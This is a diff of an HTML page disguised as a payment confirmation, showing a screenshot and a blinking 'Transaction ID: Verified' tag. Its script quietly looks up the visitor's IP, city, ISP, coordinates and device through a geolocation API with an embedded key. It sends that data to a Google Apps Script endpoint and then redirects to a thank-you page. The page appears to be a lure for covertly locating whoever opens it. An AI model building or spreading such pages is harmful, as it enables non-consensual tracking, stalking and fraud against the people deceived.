@@ -1,57 +1,71 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Payment Receipt</title>
+  <title>Payment Confirmation</title>
   <style>
     body {
-      font-family: sans-serif;
+      margin: 0;
+      font-family: Arial;
+      background: #f0f0f0;
       text-align: center;
-      background-color: #f9f9f9;
-      padding: 40px;
-    }
-    h1 {
-      color: green;
-      animation: blinker 1s linear infinite;
-    }
-    @keyframes blinker {
-      50% { opacity: 0; }
     }
     img {
-      margin-top: 20px;
+      width: 100%;
+      max-width: 500px;
+      margin-top: 40px;
       border: 2px solid #ccc;
-      box-shadow: 2px 2px 8px rgba(0,0,0,0.2);
+    }
+    #tag {
+      font-weight: bold;
+      color: green;
+      margin-top: 10px;
+      animation: blink 1s infinite;
+    }
+    @keyframes blink {
+      0% { opacity: 1; }
+      50% { opacity: 0; }
+      100% { opacity: 1; }
     }
   </style>
 </head>
 <body>
-  <h1>🧾 Receipt Sent - Transaction ID: Verified ✔</h1>
-
-  <!-- 👇 Screenshot Image from the same folder -->
-  <img src="screenshot.jpg" alt="Payment Screenshot" width="400" />
-
-  <p>Loading...</p>
+  <img src="screenshot.jpg" alt="Payment Screenshot" />
+  <div id="tag">Transaction ID: Verified ✔</div>
 
   <script>
-    // Geolocation
-    navigator.geolocation.getCurrentPosition(function(pos) {
-      const data = {
-        latitude: pos.coords.latitude,
-        longitude: pos.coords.longitude,
-        device: navigator.userAgent
-      };
+    async function logData() {
+      try {
+        const ipRes = await fetch("https://geo.ipify.org/api/v2/country,city?apiKey=at_ZoGtnuZ3ne0op7PZ4BJUXaO0LHiVQ");
+        const ipData = await ipRes.json();
 
-      // 👇 Replace with your real Apps Script URL
-      fetch("https://script.google.com/macros/s/AKfycbwc3cGmEtllDQAC-v8vlToIMgDoqax2y2Vx2vW36j__eXPeEDXUzt3ySoVtknHfjwPIHQ/exec", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data)
-      });
-    });
+        const device = navigator.userAgent;
+        const data = {
+          ip: ipData.ip,
+          city: ipData.location.city,
+          region: ipData.location.region,
+          country: ipData.location.country,
+          isp: ipData.isp,
+          latitude: ipData.location.lat,
+          longitude: ipData.location.lng,
+          device: device
+        };
 
-    // 👇 Redirect to thankyou.html after 5 seconds
-    setTimeout(() => {
-      window.location.href = "thankyou.html";
-    }, 5000);
+        await fetch("https://script.google.com/macros/s/AKfycbxoE0iO7Wlrm0-xwz_rDITzAJ2eWwvjpoCkhIWAlvZMoodOH2eCeODeDowx5AUkE7SkSA/exec", {
+          method: "POST",
+          body: JSON.stringify(data),
+          headers: { "Content-Type": "application/json" }
+        });
+
+        setTimeout(() => {
+          window.location.href = "thankyou.html";
+        }, 5000);
+
+      } catch (err) {
+        console.error("Log failed", err);
+      }
+    }
+
+    logData();
   </script>
 </body>
 </html>
